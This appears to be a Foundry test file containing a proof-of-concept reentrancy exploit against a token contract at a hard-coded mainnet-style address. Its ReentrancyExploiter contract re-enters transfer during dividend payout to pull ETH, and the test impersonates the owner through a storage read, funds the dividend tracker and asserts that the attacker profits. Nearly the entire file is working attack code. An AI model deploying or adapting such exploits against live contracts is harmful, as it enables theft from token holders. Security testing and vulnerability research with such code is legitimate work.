pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IEthBurn {
    function dividendTracker() external view returns (address);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function setExcludeFees(address account, bool excluded) external;
    function setTrueDefiRouter(address _router) external;
}

contract ReentrancyExploiter {
    IEthBurn public target;
    bool private attacking;
    uint256 private reenterCount;

    constructor(address _target) {
        target = IEthBurn(_target);
    }

    function startAttack() external {
        attacking = true;
        reenterCount = 0;
        // Trigger a transfer that will collect fees and process dividends
        // Transfer to ourselves to trigger fee collection
        target.transfer(address(this), 100 * 10**18);
        attacking = false;
    }

    // This will be called when we receive dividends
    receive() external payable {
        if (attacking && reenterCount < 3) {
            reenterCount++;
            // Reenter by transferring again
            // This exploits the reentrancy during dividend distribution
            target.transfer(address(this), 1);

            // Send ETH to attacker to capture profit
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from storage (slot 0 for Ownable)
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        address ownerAddress = address(uint160(uint256(ownerSlot)));

        // Impersonate owner to set up trading
        vm.startPrank(ownerAddress);
        // Enable trading by setting a dummy router
        address dummyRouter = address(0x123);
        IEthBurn(TARGET).setTrueDefiRouter(dummyRouter);
        // Exclude attacker from fees to avoid complications
        IEthBurn(TARGET).setExcludeFees(attacker, true);
        vm.stopPrank();

        // Get initial tokens from owner
        vm.startPrank(ownerAddress);
        uint256 initialTokens = 10000 * 10**18;
        IEthBurn(TARGET).transfer(attacker, initialTokens);
        vm.stopPrank();

        // Give attacker ETH for operations
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Deploy malicious contract that will receive dividends and reenter
        ReentrancyExploiter exploiter = new ReentrancyExploiter(TARGET);

        // Transfer tokens to exploiter to make it a token holder
        IEthBurn(TARGET).transfer(address(exploiter), 5000 * 10**18);

        // Send ETH to dividend tracker to create dividends for exploiter
        address dividendTracker = IEthBurn(TARGET).dividendTracker();
        deal(dividendTracker, 5 ether); // Fund dividend tracker

        // Trigger the exploit
        exploiter.startAttack();

        // Check if attacker gained ETH
        uint256 attackerBalanceBefore = address(attacker).balance;
        // Withdraw funds from exploiter to attacker
        exploiter.withdraw();
        uint256 attackerBalanceAfter = address(attacker).balance;
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should have gained ETH");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

